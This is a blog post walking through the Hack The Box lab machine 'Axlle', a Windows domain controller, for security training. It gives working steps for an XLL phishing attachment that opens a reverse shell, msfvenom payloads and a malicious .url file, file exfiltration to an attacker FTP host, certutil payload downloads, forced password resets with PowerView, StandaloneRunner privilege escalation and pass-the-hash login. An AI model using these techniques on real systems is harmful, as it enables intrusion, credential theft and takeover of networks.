<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Axlle</title>
<meta name=description content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Read this write up in french
Axlle is a domain controller hosting a web server and an email server …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-axlle/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Axlle"><meta property="og:description" content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Read this write up in french
Axlle is a domain controller hosting a web server and an email server …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Axlle"><meta name=twitter:description content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Read this write up in french
Axlle is a domain controller hosting a web server and an email server …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-axlle/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-axlle/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-axlle/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-axlle/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Axlle</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>November 15, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Axlle>Axlle</a></li><li>Level: Hard</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/htb-axlle/>Read this write up in french</a></p><p>Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a <code>.xll</code> attachment to gain an initial foothold. On the compromised target, we discover an <code>.eml</code> file containing details about an automated task. By leveraging this information, we craft a malicious <code>.url</code> file, enabling lateral movement to another user account and accessing the user flag. Using BloodHound, we identify the ability to force password changes on specific accounts. Exploiting this privilege, we perform another lateral movement. Finally, privilege escalation is achieved through command injection via a Windows utility.</p><p>Target IP address - <code>10.10.11.21</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.21 Axlle
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,61050,61051,61052,61056,61058,61071
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-11-15 17:09 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.21
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.058s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>25/tcp    open  smtp          hMailServer smtpd
</span></span><span style=display:flex><span>| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-title: Axlle Development
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-11-15 23:09:51Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: axlle.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: axlle.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61050/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>61052/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61056/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61058/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>61071/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-11-15T23:10:45
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: 7s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 99.31 seconds
</span></span></code></pre></div><p>Our target is a domain controller, on top of the usual AD services it features:</p><ul><li>A SMTP server on port 25 with hMailServer</li><li>A web server on port 80 with Microsoft IIS</li><li>The domain name is <code>axlle.htb</code> which we add to the <code>/etc/hosts</code> file.</li></ul><h2 id=enumeration>Enumeration</h2><p>At <code>http://axlle.htb/</code> we find a software development company website. It is under maintenance but we do get an email address for contact.</p><p><img src=/images/HTB-Axlle/axlle_website.png alt="Axlle website"></p><p>Besides the information we gained earlier nothing stands out on the website, we try some directory bruteforcing but nothing valuable is found.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://axlle.htb/ 
</code></pre><p><img src=/images/HTB-Axlle/gobuster_axlle.png alt="directory brute forcing attempt"></p><p>Our subdomain enumeration attempt is equally unhelpful.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://axlle.htb -H &#34;Host: FUZZ.axlle.htb&#34; -ic -fs 10228
</code></pre><p><img src=/images/HTB-Axlle/ffuf_axlle.png alt="subdomain enumeration attempt"></p><h2 id=initial-foothold>Initial Foothold</h2><p>Previously we learned that the attachments we send to <code>accounts@axlle.htb</code> have to be in excel format, but we cannot make use of macros since they are disabled. Another way to create phishing emails is by using <code>xll</code> files.</p><blockquote><p><code>.xll</code> files are Excel Add-In files used to extend the functionality of Microsoft Excel.</p></blockquote><p>On <a href=https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec>this website</a> we find an exploit called <code>XLL - EXEC</code> which we can use to gain a reverse shell by sending an email with a <code>.xll</code> attachmnent. The first step is to add a reverse shell to the exploit.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;windows.h&gt;</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#c678dd>__declspec</span>(<span style=color:#e06c75>dllexport</span>) <span style=color:#e5c07b>void</span> <span style=color:#c678dd>__cdecl</span> <span style=color:#61afef;font-weight:700>xlAutoOpen</span>(<span style=color:#e5c07b>void</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>void</span> <span style=color:#c678dd>__cdecl</span> <span style=color:#61afef;font-weight:700>xlAutoOpen</span>() {
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>WinExec</span>(<span style=color:#98c379>&#34;PowerShell#3 from revshells.com&#34;</span>, <span style=color:#d19a66>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>BOOL</span> <span style=color:#e06c75>APIENTRY</span> <span style=color:#61afef;font-weight:700>DllMain</span>(<span style=color:#e06c75>HMODULE</span> <span style=color:#e06c75>hModule</span>,
</span></span><span style=display:flex><span>    <span style=color:#e06c75>DWORD</span>  <span style=color:#e06c75>ul_reason_for_call</span>,
</span></span><span style=display:flex><span>    <span style=color:#e06c75>LPVOID</span> <span style=color:#e06c75>lpReserved</span>
</span></span><span style=display:flex><span>) {
</span></span><span style=display:flex><span>    <span style=color:#c678dd>switch</span> (<span style=color:#e06c75>ul_reason_for_call</span>) {
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_PROCESS_ATTACH</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_THREAD_ATTACH</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_THREAD_DETACH</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>case</span> <span style=color:#e06c75>DLL_PROCESS_DETACH</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>TRUE</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Then we compile the C program into a shared library.</p><pre tabindex=0><code>x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll phishing.c -luser32
</code></pre><p><img src=/images/HTB-Axlle/xll_compilation.png alt="xll compilation"></p><p>Finally we send the email with <a href=https://github.com/jetmore/swaks>swaks</a>.</p><p><img src=/images/HTB-Axlle/phishing_email.png alt="phishing email sent"></p><pre tabindex=0><code>swaks --to accounts@axlle.htb --from kscorpio@axlle.htb --header &#34;Subject: Open the doors&#34; --body &#34;Nothing to see here...&#34; --attach @shell.xll
</code></pre><p>After a couple of minutes we get a shell as <code>gideon.hamill</code>.</p><p><img src=/images/HTB-Axlle/foothold.png alt="shell as gideon.hamill"></p><h3 id=rabbit-hole-database-exploitation>Rabbit Hole (Database exploitation)</h3><p>This account does not have anything interesting in the common directories such as <code>Desktop</code>, <code>Documents</code>, and <code>Downloads</code>; we probably need to look elsewhere. From experience we know that <code>hMailServer</code> usually has some hard coded password in its <code>INI</code> file. We access it at <code>C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI</code> and discover the administrator password and the database password.</p><p><img src=/images/HTB-Axlle/hmailserver_pwds.png alt="hMailServer passwords found"></p><p>We are unable to crack the first hash, but if we manage to recover the database password we might be able to recover some users passwords. We can use <a href=https://github.com/GitMirar/hMailDatabasePasswordDecrypter>this decrypter</a> to find the database password, <code>4A02D41C55AC</code>.</p><p><img src=/images/HTB-Axlle/database_pwd.png alt="database password"></p><p>Since the database type is <code>MSSQLCE</code>, we can download the <code>.sdf</code> file on our local machine (I used the <code>download</code> command in a meterpreter shell). The <code>.sdf</code> file is in <code>C:\Program Files (x86)\hMailServer\Database</code>.</p><p><img src=/images/HTB-Axlle/sdf_file_location.png alt="sdf file location"></p><blockquote><p>An <code>.sdf</code> file (SQL Server Compact Database File) is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).</p></blockquote><p>Go on <a href=https://www.rebasedata.com>rebasedata</a> and convert your <code>.sdf</code> file to a <code>sqlite</code> format.</p><p><img src=/images/HTB-Axlle/sdf_file_conversion.png alt="sdf file conversion"></p><p>After the conversion is completed, download the <code>result.zip</code> file. Extract it and you will get a file called <code>data.sqlite</code>. Run the following queries and you will find a hash for <code>accounts@axlle.htb</code>.</p><pre tabindex=0><code>sqlite3 data.sqlite
.tables
SELECT * FROM hm_accounts;
</code></pre><p><img src=/images/HTB-Axlle/db_hashes.png alt="database password hash found"></p><p>Unfortunately we are unable to also crack this hash, let&rsquo;s assume this was a rabbit hole and look for another exploitation path.</p><p><img src=/images/HTB-Axlle/hmailserver_hashcrack_fail.png alt="hmailserver hash cracking failure"></p><h3 id=url-file-exploitation-shell-as-dallonmatrix>.URL file exploitation (shell as dallon.matrix)</h3><p>In <code>C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F</code> we find an <code>.eml</code> file.</p><blockquote><p>An <code>.eml</code> file is an email message saved in the MIME RFC 822 standard format. These files are typically created by email programs such as Microsoft Outlook, Mozilla Thunderbird, and others. The <code>.eml</code> file format preserves the original email header, body, and any attachments, making it useful for archiving and transferring email messages.</p></blockquote><p><img src=/images/HTB-Axlle/eml_file.png alt="eml file location"></p><p>We send it to our local machine via FTP (it can also be done with the <code>download</code> command in meterpreter used earlier).</p><pre tabindex=0><code>pip3 install pyftpdlib
python3 -m pyftpdlib --port 21 --write
</code></pre><p>On the target run the command below and you will receive the eml file on the FTP server:</p><pre tabindex=0><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://YOUR_IP/{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&#39;, &#39;C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&#39;)
</code></pre><p><img src=/images/HTB-Axlle/eml_file_dl.png alt="eml file download"></p><p>We learn that we can drop some URLs in the <code>C:\inetpub\testing</code> folder, and they will be automatically executed.</p><p><img src=/images/HTB-Axlle/webdev-team-email.png alt="content of eml file"></p><p>We can upload a <code>.url</code> file that points to a malicious file into the <code>testing</code> folder.</p><blockquote><p><code>.url</code> files are commonly known as internet shortcuts. They are used to create shortcuts to websites or web resources, allowing users to quickly access them without having to navigate through a web browser.</p></blockquote><ol><li>Create an <code>.exe</code> file with msfvenom.</li></ol><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe
</code></pre><p><img src=/images/HTB-Axlle/malicious_exe.png alt="malicious exe file"></p><ol start=2><li>Set up the listener in Metasploit.</li></ol><pre tabindex=0><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost YOUR_IP
set lport PORT_NUMBER
run
</code></pre><ol start=3><li>Create the <code>.url</code> file with the following content.</li></ol><pre tabindex=0><code>[InternetShortcut]
URL=file://YOUR_IP/share/payload.exe
</code></pre><ol start=4><li>Start a SMB server and a web server.</li></ol><pre tabindex=0><code>impacket-smbserver -smb2support share .

python3 -m http.server
</code></pre><p><img src=/images/HTB-Axlle/smb-server.png alt="smb server"></p><ol start=5><li>Place the .url file in the testing folder.</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/evil.url evil.url
</code></pre><p><img src=/images/HTB-Axlle/evil_url_download.png alt="evil url file download"></p><p>After a few seconds we get a meterpreter shell as <code>dallon.matrix</code>.</p><p><img src=/images/HTB-Axlle/dallon_shell.png alt="dallon.matrix shell"></p><p>Note that we also get the password hash of <code>dallon.matrix</code> on the SMB server.</p><p><img src=/images/HTB-Axlle/dallon_pwd_hash.png alt="dallon.matrix password hash"></p><p>But we are unable to crack it.</p><pre tabindex=0><code>hashcat -a 0 -m 5600 dallon_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Axlle/dallon_hashcrack_fail.png alt="dallon.matrix password hash crack failure"></p><p>On the Desktop, we find the user flag.</p><p><img src=/images/HTB-Axlle/user_flag.png alt="user flag"></p><h3 id=lateral-movement-shell-as-bazhumphries>Lateral Movement (shell as baz.humphries)</h3><p>For the Active Directory enumeration we will use <a href=https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe>SharpHound.exe</a>.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
</code></pre><p>After executing it, download the <code>zip</code> file.</p><p><img src=/images/HTB-Axlle/sharphound_zip_file.png alt="sharphound zip file"></p><p>Unzip it and load the files into Bloodhound.</p><p>Find <code>dallon.matrix</code> and you will see that he is a member of the <code>Web Devs</code> group.</p><p><img src=/images/HTB-Axlle/web_devs_group.png alt="web devs group"></p><p>The members of the <code>Web Devs</code> group can change the password of <code>Baz.Humphries</code> and <code>Jacob.Greeny</code> because of <code>ForceChangePassword</code> which we can abuse with <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>PowerView</a>.</p><blockquote><p>This account attribute allows the enforcement of a password change even without knowing the user&rsquo;s current password. <em>Read more about it <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword>here</a>.</em></p></blockquote><p><img src=/images/HTB-Axlle/ForeceChangePassword.png alt=ForceChangePassword></p><p>Import PowerView on the target.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1

Import-Module ./powerview.ps1
</code></pre><p>We change the password of <code>baz.humphries</code>.</p><pre tabindex=0><code>$pass = ConvertTo-SecureString &#39;PleaseLetMeIn007!&#39; -AsPlainText -Force

Set-DomainUserPassword -Identity Baz.Humphries -AccountPassword $pass
</code></pre><p><img src=/images/HTB-Axlle/password_change.png alt="Baz Humphries password change"></p><p>We login with evil-winrm as <code>baz.humphries</code>.</p><pre tabindex=0><code>evil-winrm -u &#34;baz.humphries&#34; -p PleaseLetMeIn007! -i axlle.htb
</code></pre><p><img src=/images/HTB-Axlle/baz_humphries_login.png alt="Baz Humphries login"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>In <code>C:\App Development\kbfiltr</code> we find a <code>README.md</code> file. One of the line reads &ldquo;<strong>NOTE: I have automated the running of <code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe</code> as SYSTEM to test and debug this driver in a standalone environment</strong>&rdquo;.</p><p><img src=/images/HTB-Axlle/README-location.png alt="README location"></p><p><a href=https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md>This Github page</a> shows how to exploit <code>StandaloneRunner.exe</code>.</p><ol><li>Create a <code>reboot.rsf</code> file, its content should be as below. This file should be in the current directory of execution where the <code>exe</code> and <code>dll</code> files are.</li></ol><pre tabindex=0><code>myTestDir
True
</code></pre><ol start=2><li><p>Create a directory with the following structure <code>myTestDir\working</code>.</p></li><li><p>Create an empty <code>rsf.rsf</code> file inside <code>myTestDir\working</code>.</p></li><li><p>Create <code>command.txt</code> with the reverse shell command in the same directory as <code>standalonerunner.exe</code>. (for the reverse shell I used PowerShell #3 (Base64) on <a href=https://www.revshells.com/>revshells.com</a>)</p></li></ol><p>We can use the powershell script below to automate all these steps.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#e06c75>certutil</span>.<span style=color:#e06c75>exe</span> <span style=color:#e06c75>-urlcache</span> <span style=color:#e06c75>-split</span> <span style=color:#56b6c2>-f</span> <span style=color:#98c379>&#34;http://YOUR_IP:WEBSERVER_PORT/reboot.rsf&#34;</span> <span style=color:#98c379>&#34;reboot.rsf&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>New-Item</span> <span style=color:#e06c75>-Path</span> <span style=color:#98c379>&#34;myTestDir\working&#34;</span> <span style=color:#e06c75>-ItemType</span> <span style=color:#98c379>&#34;Directory&#34;</span> <span style=color:#e06c75>-Force</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>New-Item</span> <span style=color:#e06c75>-Path</span> <span style=color:#98c379>&#34;myTestDir\working&#34;</span> <span style=color:#e06c75>-Name</span> <span style=color:#98c379>&#34;rsf.rsf&#34;</span> <span style=color:#e06c75>-ItemType</span> <span style=color:#98c379>&#34;File&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>certutil</span>.<span style=color:#e06c75>exe</span> <span style=color:#e06c75>-urlcache</span> <span style=color:#e06c75>-split</span> <span style=color:#56b6c2>-f</span> <span style=color:#98c379>&#34;http://YOUR_IP:WEBSERVER_PORT/command.txt&#34;</span> <span style=color:#98c379>&#34;command.txt&#34;</span>
</span></span></code></pre></div><p><img src=/images/HTB-Axlle/exploit_script.png alt="exploit script"></p><p>After a few seconds we get a shell as administrator and we can read the root flag.</p><p><img src=/images/HTB-Axlle/root_flag.png alt="root flag"></p><h2 id=beyond-root>Beyond Root</h2><p>Our access to the administrator account is a long and tedious process. In order to establish persistence we can switch to a meterpreter shell and dump the hashes with <code>hashdump</code>. We then recover the password hashes of many accounts on the target.</p><p><img src=/images/HTB-Axlle/hashdump.png alt="hashdump command"></p><p>We do not even need to crack it, since we can use them with evil-winrm in order to login.</p><pre tabindex=0><code>evil-winrm -u &#34;Administrator&#34; -H 6322b5b9f9daecb0fefd594fa6fafb6a -i dc.axlle.htb
</code></pre><p><img src=/images/HTB-Axlle/Admin-login.png alt="administrator login via evil-winrm"></p><p>Thank you for reading this write up!</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-blazorized/>&#8592;
Previous:
HTB: Blazorized</a></p><p class=prev-post-date>November 7, 2024</p></div><div class=next-post><p><a href=/posts/htb-compiled/>Next:
HTB: Compiled
&#8594;</a></p><p class=next-post-date>December 13, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#rabbit-hole-database-exploitation>Rabbit Hole (Database exploitation)</a></li><li><a href=#url-file-exploitation-shell-as-dallonmatrix>.URL file exploitation (shell as dallon.matrix)</a></li><li><a href=#lateral-movement-shell-as-bazhumphries>Lateral Movement (shell as baz.humphries)</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#beyond-root>Beyond Root</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>